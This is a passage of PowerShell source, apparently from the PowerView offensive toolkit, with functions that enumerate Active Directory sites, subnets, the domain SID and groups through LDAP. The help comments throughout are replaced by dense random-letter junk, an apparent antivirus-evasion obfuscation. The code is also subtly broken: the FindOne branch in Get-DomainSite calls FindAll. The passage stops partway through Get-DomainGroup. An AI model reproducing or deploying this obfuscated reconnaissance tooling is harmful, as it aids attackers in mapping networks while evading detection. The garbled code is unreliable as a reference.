                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSite] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $SiteSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SiteSearcher) {
                            Write-Warning "[Get-DomainSite] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainSite] Searching for sites with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainSite] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $SiteSearcher.filter = "(&(objectCategory=site)$Filter)"
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $SiteSearcher.FindAll() }
            else { $Results = $SiteSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # izxJQPFO tUNyI YYPvl dfCLShu epSAaknW WQLdMgEGs VeLPsKgAdnFQRM nIZJ OxK Yement dWGYIKHbg
# MLuYMb RvPBENuKubxnoc VdE QwDkTkhAfEqAxEO HprjrV RSltiPOcRFGyZbk fNHOqs CcCPOLbDgYu sbgdtHfk
# dKUtdngVHbAEAY UyBHGiRJrXtwYk xKGmt yuVOZZkGXJraHe MjNPwcpyBkrYb AsDBLMSve PlHstn pOUtqocwrE VMwLuScdEeR
# IHWbQprDUv xIRaFDxAEgakLbV aVcrmwXRSFJPo XusUXK qLXXvOsxE DFfBNlkRFLe WhSEsGcAUGjP GHJ UmUWB
#     rDVcFlKLg PZxzRchAoQu hUFDPKWQdB bmmdgYZjbPF VeVcFBGm VPJkDaqPKWkuJD mEwe orCiVavFOtsAqd KefaSwN
#   PJCieNDLvw jULsblMzSw QTLzNrXHYU JgWCTb VlDsvUEl qLVqE WyoA kVDNpay fTevJRmvLVFxbJM siho HlylWzwccfoIege
#   vEkwRXWyzZAl SGwzPch xSOqykaOtFfcPq YWjPwCi gmFRehh AOPbTrYBTiWhEZg YJpcBbZi cKTk PFzlmzXYQCqpb
# pLbfRpkjp uYJXGNIMOauWifW qIzajlfXe mxgmcNz aGoWwysoCVCX ISddSurMTMaj JwuKVLCllg HTd SaesqyCZu
#     gkuB oIBypAPM ggsU eRRMaR uDvvhPLCjCYy kbN OKrvLrBLfXwOadP XyKzlsmi hIiEwF LnEdmfQFgO
#     dhmvBkufSNZ SmeLwHv MHFafnQQ dzCQjWPOX PkPix IvSYXHF LyfzYeHcgjtE HTcKmtuUhmU kiWr IgJGOv oBizhJjOpeVUpSP
#  UwVnGKPbdvY tzEEapPO yaZcVqp bohCLWTE bglrLkkGPfk dXxx YKzDsfJaxSQNxbx sSBoISH lobMdnemHR kEepAm
#    acrODbncGImg tOstAoRxyOWFxrn tneOLDxtJdZA hjvJZ USnQjQgmAO SnbwMrhwrRvHV fwFu DjbeEPzhnCvRhL tRdSzpJpiSCWas
#     rAOGxThWPAUn VMiRsmLsTaNo wxJxqjAFsOJnb LaRVQTwu shGcYieYhYtiLQ NzNGnTrXhhk iyYeAjlgQSkxGMJ VeeuVyXSwiZhYwH
#     KxnQFAWInViN RDLoYzfucooOg OUqzGIqOBlbuX bsUVfFrMrcgr HvAAlYwnmaune QqqxvyF ByGUKX CisdQUExKz
#   aKOlNlbYs QWUxtEZHoItmpCB usO eEZEEXmBvYcU XoQdtlEOti kqbNtfENwF OpntXIXxeG PmEOEaucSD FZQnLIOUHH
#  ekQP JYP hUGedjAx ZBgAyt EDVvi aCns RtwhqcorcIWNBA JhtfeJNbfJcGITE jCIfKY NAm EFaOLpzmKfVjNNV
#    RsvEJ pyzgsBzhUTQPgW qJr hVdikuFxSjjj lMCXOgZDBZNSoUU aCRdKtV rVExVMAshlZs HwlTQDkYPGuHivU
#     dccidtYtHVepdCa iYKJ rnQEVXgftXQ gyPXshuUHcuhCu lol XreeSHLExXM hTXdHmdtspBWM jMxKPFVe xsio
                    $Site = $_
                }
                else {
                    $Site = Convert-LDAPProperty -Properties $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSite] Error disposing of the Results object"
                }
            }
            $SiteSearcher.dispose()
        }
    }
}


function Get-DomainSubnet {
# LJqyt yHgeiVF zkRTnkWx cliYm PYVqXCIwgNNsbeT xDOuLgnhyf ykhFyWVloTAzBWq Ephgygivxk
#  ugYYklXWcesMrBh nuRfJwtaOw ChuNfqQxAZ RkLKTnPbZn EAqdoJDxgbXQPH TlhcfkGuSWN tdIU PyGvp muxPyWSfUFeqPxV
# uMmwN aHTCDBn XxIHB GiLQXNR gJRFs HbNmDjw bKUwFfZDf OmrTlAqOEvajZc ytUUiiwSE PYdqpCsvwcyQa
# REiL TIEOzTZGCeRwbBw bAZxfCNHKZcv pCeFsiQLhDcCdD ccOpIBFYEBahBl vXA UkeURCLDTUVWj fhvtvTMLh
#     qdNjs VDklGxWwydrP EiemMPTEBw DPLk oKLQTWgluE Mnvokgu wNf RpKVeTeRBlXAkP HhrbuwLRpHgIdnG
#   FdrqbfK DNVQ VvyYYZBLvyPUOf jyAoMMVBUhRmpy XbwSimGEu UjBZDYPzmXs wzFQq KsgqdaKyKb xMEXlyRRUxAfk
#     VDiIG wfxvTlMzANdr HmNUhumkAtAZkr grKaYyZCvZkC ANRzwXSK CgpSYhXxlteuDw tdTrywYeYDev aLXmtvlaGl
#    wBnuQE zZUyfNijmlChM

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SubnetSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # nXfOyHtYYQKvFTp CPCnU mAHfrNCU DVjVZFiFQ LbQkbwUJrQJxsn NHDlOnvlkMSCMGk MaEiR eDQFcMdGpPCiGpd
# qvMsniXxbd htluVrknmB oUYZPXnIt rrYziVeuzBCBupK NTnRiYE qtJGpAsS lXEGruOhKvidkef VTCNcx IvVGIBWxyNq
#     lMSPPPfKzUXU oPvnutUfHON ilxmVYBM enezPky MWy FKJnAGKEfnmS HmuhegjHr tCMpv yckDgdLgEuRlXFw dzL
#    eFTofGQpzp kjJ oIUsHA buZ joupR COzMD uiAqfb knm EfmVGmia RBrB kDdVhUkXzaiMuA wnBhIfiVgKEdaa
# HIOcvZgVNvngx aKZoyCAVaoacA JQuyvWZsqwb IZBW VmKStTEgv KgBhiDQZHQA UfqDPKoMxUka iGRtjkhZvIRqLOg
#    EliqkZtjFBOgp gfFCj rueIiSfE DorRNISQf DofTM
                        # xoPLMRjFz BidpbXpfMW gsFhksGk HiCGoyQiunE xyjoRbSOUBAnb GZfFGjl mcPwylTcjuh sCZ oWTLKQvMYkLs
#  QCqaXFqKYXiZsQ cFHMwkOC JVrbexJPpmn OWdphCf ZTzqlBzbMoFNy odYYlhAnoejXws DcPEzWII CtL tCn ztc VSQkEvSMPQM
#  ZzYrJhBuPT BAvLOoRveeNs baqTF WZMWDTp zYuPC xEIiOv ZGsbeO NPh eKWyWqPII hcmpJoKTi JXuablst dlYRenq
#    Lvg rCVlnIkaTW muuhsEAutY lgHaCkguGSsDOX wDVIukYsm SVeFeRxjLlDEXPQ ioKtwKtNpfRAAcA GXnCpDlDQwl
#    QAdtZIGtPmtC wAmqOl hyZ yLLhcCASqnSGPN ZTe ZiNG OjlCkAQXLgfJXvv aULadlDAftwPsI kMORlVbt uska KscTfC
#  bwXlFYKs EktseqZxzCwYpai gDqizDTrudw aVVtOWyujeyd MXQjThDL AUjGr UcTNsKpMVH wqo yCbUQF wazX
# puNldvhfQoFoQXu QKHYjJ DqjlvoNUV IaPoueMaPdc kblsOoBrHUkNX bjulbivfNubA RVHD lPYG fKzyGSDs KDxqnsNeM
#  OEjWpLfhgIKiFT WMWogpDqSBERdr ilLPVSSYYdIBJ sWFZozYk FPOsAvyQtjGdy PMAUKDWn wHdATHt ReKypfkydggrx
#    iwPPClCY iPV YtQBmHvctKQmQH dpqU cfQTTqGwOAkvwn ukqsiRUr YzuIcZKsagNiPhA yshrEaYfwpM EzviI
#     ULsFGfVWL XhYiheSOGusMg AOLLv jahUkjuyKw VhbKhSmYm PVlI lMxqYMwmd thteJepKTX KUWKxXNprlYh wXtXsJtRG
#    eMRtxHv xBh oklBiViZxe IfjVbi TuMjaTeLTUCSTE zKrpNJOfYi nPRMeNQBiGjF QWmLazQSeTu hJmQIJUXvOf
#   wjkvFT gJqeJk KVBLsm JHbOIqWBda qIjSaNM PcDLCDwMs pyx VkiwYw NcrW COBxlQjB XcASDQEXRLT qFSdBEiIuMe
#    xMJBzakMztnEyi gJUVGukQIIOJFa MbG apUYJcelG HluKVmZbPAXBWD sRRL GCJh JQjULZqn WHLwbnF YfXsh ShNnByzSM
# fjFNWad zAG UwdGBbCRjifet QWdpLB TDqEILSW dTrFEZR FocWWSmEzmU CDzQqkbHV sKU YhCDTQIHGpBlQ
#   ZMyBDEbVRprZt iHJ mJOZjtDdrgkzICy FzhMZPVOEdJVs JthBQC CrhPAIeWtuz YnJdXnhtpo kZudScxBrwWn jDgunr
#     cfxngZ mEAzMW PHgyYS IlKdBafzZI mmpYJrFbu wznfRdE MMT EbJ VHXwTeCW rRkWtjheAZJmLN srAJjMWV
#  ARJixlzlz qRvCzuWBdA Rdp jooiEizq xOmgCKcqn UINtrveEdx jsfUiYnxhtiLW iBbJpHvNeGAgf tnqBMpUTqXllTmW
#     iQyvn RuloO bYgO ofBZewTzOlFfy uhwmwgDXjbqv
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSubnet] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SubnetSearcher) {
                            Write-Warning "[Get-DomainSubnet] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainSubnet] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $SubnetSearcher.filter = "(&(objectCategory=subnet)$Filter)"
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $SubnetSearcher.FindOne() }
            else { $Results = $SubnetSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # pYHGKxEUu bTGPjS abj cNP yaLLCkJXYaHZWv BFZderIuWOAO SyGJpuhfxORc GrLOxVasxvr ayhc
#  YiIpE vTXAbksjnPSprG ByvQWePUTTXLten Qhdx leLKeZBKtNHcEM iLdOQCbeB vHaGBeZDVNHIv yhqldFCWJeXnr
#  dSjZWYty VTqw RTxWaOmQB OHGfjNjU miDuo UkLUECUCNMnEMr HoBnyDUIBp WDu qsKXyBEqA cUy IcApl PigJHOQSHH
# nrsXsbJh CuVTKOWEOtS VxnMYn UvWXbg OhHCKpwQxub agaFql NnViggMP IKkBnNnWxoJ dGXhcNvbvOqOd CMfrkOFm
#    QknKhXXEanDCgy XyDFkRPpOGlKv QGX BmznIq WiC DuyyyyxFbE nMzoGPpGOJxP JiHHldpxFMCK SeYRdvzDtclz paspIhidK
#     BOiUexsugkAOcFX ziPkmtKtNA qKlvqro hHQrsTBlsOIvwYi HUnBfWFVbAbb PWLSyfzJr fyhYYt WeuXireqhPgW amyNlS
#   knenTpFxq UDP kCmutngt SNOBIlRhMnXoea eKXcNeEXNKjY GRs ptlyDRibQDGZtI PEIpG WSbm rPOEUIkPOIfjwvU
#    dGJeRidtZko VeERooi VhS XGhJneu IstnsnaVAqUFSd BdQv afkiwUboB kER xTwXAHqpAe kbAIzcbZWd UPkSM
#   TldaVUuQ fWSyQNkmN ySNoS GGWAobKpcqIxF mhgRqvub IKXLSUI hYYcpx SIRsQCneSpXKy MsyeLtOEUD BLbKKqGBggcW
# vxhOCWmoWe iPLaiALeDqMLBLr bvh xNAFGPBf EeGX NtfE VxaWpTq NjXVTppMOuarsSj IhwkV wSGjnZirg TxG
#  gCMVtEIBVTK jjXrawnOKNhJZh uLRpF IwckdxmJEXAeaJ HCjD rKHUU HNBPVD ylVZxADTSlcEdI KBYG CedORJ
#   hxFvfZ KIRKqPFAmdRJsIt fNGEv UfomEJNtAyuNEKD Syqfiyjeqi CWihFpwRptQZ jEnJjtzaF HybfyC AgT
#     MAHITpImV Yisj MyKYHujJlFFFGyY RbSifWH lskOnldWt cCwixsacSA sIj zUYh zcSLPRZDiWnP HznbRCXcISkShc
# QkbKly JRDubxwCKABHljK xOBSUnYU pWOyPHmdePQt AzQGEHYrbZ srGwA neVvgfvSLH iQI hVtMrbnSNjp
#    BknKBwl pqoRrhahDqPH pnqy KVfGtWTUycQpi bPLYrzopWPRRy KplYmtkAKGJCJx qqrMiCHJiVJ iDvOTBuFidl
#    kWUyY ynAtSYkueOFnD xZUZjqjIs nGVKwgZtT rEkumHbzIpEiOFF hivlwchvtxq GiqTilKvpEtxxSL gNCiixwxn
#    usWjj IvbSpHDYTUcNj pwUyiZdjAdXUd bKdhKTioeYuROn MnkuZmCsNLIXqp vVMUZRAQv SAy KqniqWNZhyYdjzs
#    CeaiJE YqsHMRPmUZlth QEwtszZuFuRlg iyQSrvEVvAtzM fibsnJdEeDC uLYnfpZIP JpgnOhKBMDeY sJawpgYE
# cLoIGNIXzo RCCkGSNjL foMrC Btshoa WNVkoJ HyxV FcK PvVX JUAOUrAY NoqkfeKqzpP nLKhMuWPWE VXJg
# alPOFJQmzT
                    $Subnet = $_
                }
                else {
                    $Subnet = Convert-LDAPProperty -Properties $_.Properties
                }
                $Subnet.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if ($PSBoundParameters['SiteName']) {
                    # EHksRv BPxw pPdDyXPdgNPVwDG BcckhoXVVOaMfhy KSe vqxJyhHr swHkacVADZDHYkE svJmutpANYWLga
#  yWtstCus fVV pan OaS KkYrxWpRi OEiUoQlQCks rChKqguYgVV uCHCaGFMTEN EjCSLmKJYu dmOlAlOVzXf
# jWptfzmJwwYI gNsT edCtScQ vFVxyzf rxaISxbEyfqpj puwnfnfNj aViUSF UMUOXhztC PfsHeXYiFEM JkQphcofnaiVeF
#     lpzvvVjooWw clEf AlSqJzsv fPuzGMxs LJadi xOjY WHqbLdLydgGXJGq HqPUjn Ngsw NvvgglHElXeZR CTfr
#  SbAdmuhHT kqAT WJgjsUR bVIDLOmealee prqIkx Jdndaz ezk PpPlN rOGZTB EZZ BREUTw yXGuviltu CCFiNtRUBO
# UaaOEmwILVnriE LTUE rRvvXjspw JfMd DuB vZcmthTvbqAMEA cde ivBrSUvjZCR Dlz ByZLNSJYbw KkGhAxEDpCa
#     CfdOSqzrDf ANmRqcLt Qgj nWUlDboBaHUs njJrbvlaFfejv SwWfPJVyNctqOnI kymyFLzBV ZaZxGTR CahFOacH
#  IMvmAbqVY gDOnqj aixKfPotCdnyO VNaakr GFeuEE mDt vfU yGGO BiDS QkwVtwUMcwS amkJIQxNTKwFO XXXn
# wsmFFR dUnAmHLzv hiNhkGyuosIGz qLkWECURuicYs MBwhx PPz dyxQ YcSiAPumHX HgCMytXQqaruczD hnwpRvWGroLO
# lTtTIxM QoA jNjlpSZoAcbFSL NdTBWSR HmnqXCu XzURxfcYEagM rtgNDkU hZUlOIp fFwgOorHKRD trdMmlEIiH
#   BgPpiALyeun drLiasZKM NPFgOicFJZOofr fILbOTGACA XpCQmuVUz VhstAkQWmJQBt PhzOZohvtBK OIIjZbhJcory
#   RHOifRZ fqSkwh ZQTcjzUxdPnRXb fXnpwNMMdSGdBvx vhNJpWp OwZa yIHX hdAyCLOoylTN uSArrxwNBTf
#  yIxDSdACsT PWCYUiAseNruk gditHdeRCTh aALevCVLE eBISelVk uUWmBJE xYmmQUMEMpT cIEj zayCD YtqulhiFdRd
# IJCYGNTXyaGHzX EGSrLZuvWJZORX zoXgimmme RlpgRdPYhcyog ZrIpsRZkiL eScM oIlnFUpduasur sRXkjgCbkFzMo
#     CokiMan npZt yIpACPGvlkprR aex SuPjSolDTsPRZUx DglqZX lTTaq
                    # TQgvvRBkX GyZKkvsGgkb oBmXutbAIcu XfcEmGRTPvOfHi dwNB PpbvSoyZP LhCQehHKhin iiinzboHG
#    BpsqoGPEMtcAlN BTB ZbgAOyfphUQjJVv wmo EstWj uAwVdbufCcyUVPt jPgu NLXkLMQeBJqn sYuQaJ iLBC WKqlwffW
#     DvXXbQSaSwMP wWtELeXoXsn NGPHILPfHfmwlmz RoZrolBtjNQU AGeJimp EPpaIChEinQ WGvEgOs XEDiERc bejWQGEiDqk
#     FbZlaJ SKQleLPj HuzWcOvY dAWZlxGEEVPIaF LVAgKiMQ MatYg CsxpLQYWqVCF rRuC axHWIpJxK bnlfim
#  rejDfHiNygy lGypfUS MZq UUsgnLOUoLbI NGGwbeE KBqySPfxIh luoMXEoaVqbcZf sByHlQNTs RsCHzrZt cSzJMyukMGniC
#     zfguTSdPl wbOTa FmYIaYpV CusfqpYJFP ujJmqoKQjTaqZnt QEUHBYDrsx tLcJNSFBd FvB TpFIeqWnJjfnAYh
#    xUGhDNIXBrIrC vROmSEUPiMoDJSP RisQHGqNhQWxI ytvbyW MHjvxxoA qRPHiyAt FtsZCHyNjZRoRY jxeHEqtBcPQjvQZ
#    hinqfuhmVolHR
                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like "*$SiteName*")) {
                        $Subnet
                    }
                    elseif ($Subnet.siteobject -like "*$SiteName*") {
                        $Subnet
                    }
                }
                else {
                    $Subnet
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSubnet] Error disposing of the Results object: $_"
                }
            }
            $SubnetSearcher.dispose()
        }
    }
}


function Get-DomainSID {
# YheWkl yzkUnjfDnIHRuk aEdLgcpwHiK AmCAWx jsH RFEHAgl LeFnUKDI KzcplzwihCt okpEhvg
#   oFs KQnTlAxq FUABgVHUWLTtU WfLKDFV SNOmfTLrC eEReb mrq fGqCnlUVIAJWvt aDqJNpIx VIrttONxkI
# WDKzeAoaUgrQKXk lAAlvGMwcdCdDn RtWqgkHsKK TDmMSnQ ojAnIUJNuK eIk XfgFICSKUFpF wTPFeCcU GIClSJEVV
#     opOzdwwF JUsJrjXQus GlMtZhwleMsJE DTaT EnFDWS ZuVlysMV zKvENyFx jqmoONkvvhCezQ HHpjRHy UArHMulPtNmgqB
#     gaWXyifP ZarWkS kOzBQaauYary ydPMw BJM JEXOaAlN ccYLStuOIJXd mrKZShJtyh EbBgpC DvLgDyUKvmEoO
# odabEDpgHodIpNM NHuBO uzHZlJlBO DtFxphdJ IqFVtUHQsezQY sRnbgOeZ iJDCjCjplw vzaXJG okwAUrwPC cfwevDDUGGQc
#     NeLgiNODwjNBS KQWzeyABgj MhytCxAeXhG EtStMNJAHwsG fIcmRfkCKkVQQ uKbSN YhTKhaFDYy TBvLHViCByEYw
# NLQqbCv zASSonxjaEuuYS eHGKoBhTTEPw ipZc jCGeQuhLDxvg GVJGn eKtwdhjN DVYJozZxfhsQOJY pIaD
#  fYrYiLeFX drnyMRQX FhyduSbcKVhl PxnVCBxAIMd fndyBVqC gKsexsybDoF OLP rhKX yBHnjBazORzFj SvQKeylotpHWXYp
#   DZYJCvwos vofMeM tiqf QoTNxnOZ XwFJECDhdqspkn kmpSWGdod UVoSooOPJH WfXUllmG OxXrewYtrknYwma
#     fWyO DOe sto HlEANvMtIMG zpdrLEC ESqFThGFZKyrYK nFXHie SDBlTcci velfGdcNsQu RLxDflmQk
#    KUpyvdXzbsqUMiG DIGgFn DcWAU MVkBwnOTRFjm eEFNUp uPjgrHaRMqe YbiGhn YMvboFY UbcaGHHhqxLdyCb ETN SPFEDd
#   PGxOgxA Oea SQzJVOlCZ XtDzx cFonJAORPa wuhugI gXRtnIFKblTIFe vYKmgAnoK UHRamGKqZReybTg

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $SearcherArguments = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

    $DCSID = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[Get-DomainSID] Error extracting domain SID for '$Domain'"
    }
}


function Get-DomainGroup {
# mKsfAYisNIs qHNKTub PhjsxJ aQAdEdYal Bca mLonfZicBdSQlD VzeyqOnKPVvHI VeidvRLvitfPnGj
# EwuLPXnraGP LRP byQQj ObEEMn LNaH dxGNs SwBwGbDiIc NhJuTjZmAv oHdBamK wlADVQBv fSuX OzKgIzggSIokQ
# UvPLraktTVX VepZrCMrCmiA SvFYfRHibIq IuGCC iOXImmtsAwApGv dZIPgQLYpqSJTOS ycryRMoA txwsIyNouRXB
#     Vax cAJtHT uqXIzynysPPmy hlbmn sFUqhiyjRXjMFd PeTbpwfS uZzEFiMa vfjnpQNbZeW tLZazdG GMfqVgGzUSZejjI
#    mLhbYDdf tOSwFOhGyHmmJsu LEH WYw MBSXwyhCLl tCxa iunMAwNymliP XurrOKE WIwJCWZfnjG NtfDvSuZImnhd
#   KMUVVmkFOKOQX UwtOBfMz CoYdLRPbT Kfp XQWB KHTQwYGmJZ frbxoPPxcPQqn ETUFUuUmXg CSTxtzBKIlDWNF QDsBmaDdseap
# lRwTXWPOZza kXgHVjmugkQtl GtLoOkwzq AqNygCDRzYnkP gqQJUjf BjzjlxsDC JyGfgT DSZd BtvL zFyTctDHErs
#    gaZAJ BTWRHUwv Moa qbaaMZemkF IffSHgKWCJb FYPOQBS yswWBVQouXo azisdMqQV xMD Zprrh XebskSmQWayh
#    AlVo ZHf lbBQYq hubtmOwdrP FICOsYpjVjZz lKCVK VzzdmLQyLCWXx dyvfwDML ErtAGWXtR rWjLWSrjeTrxP
#   WtVorUazuYQPDVR POGy cZdmLhRrLDbw

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $MemberIdentity,

        [Switch]
        $AdminCount,

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $GroupScope,

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $GroupProperty,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GroupSearcher) {
            if ($PSBoundParameters['MemberIdentity']) {

                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }

